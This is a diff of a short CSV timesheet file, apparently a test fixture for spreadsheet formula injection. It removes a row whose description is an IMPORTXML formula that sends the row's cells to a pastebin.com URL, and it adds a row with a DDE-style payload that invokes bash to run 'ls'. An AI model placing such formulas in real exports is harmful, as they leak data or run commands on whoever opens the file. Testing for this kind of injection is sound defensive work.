@@ -1,4 +1,4 @@
 UserId,BillToDate,ProjectName,Description,DurationMinutes
 1,2017-07-25,Test Project,Flipped the jibbet,60
 2,2017-07-25,Important Client,"Bop, dop, and giglip", 240
-2,2017-07-25,Important Client,"=IMPORTXML(CONCAT(""https://pastebin.com/raw/1qVgCRM8?v="", CONCATENATE(A2:E2)), ""//a"")",240
+2,2017-07-25,Important Client,"=2+5+bash|'ls'!A0", 240
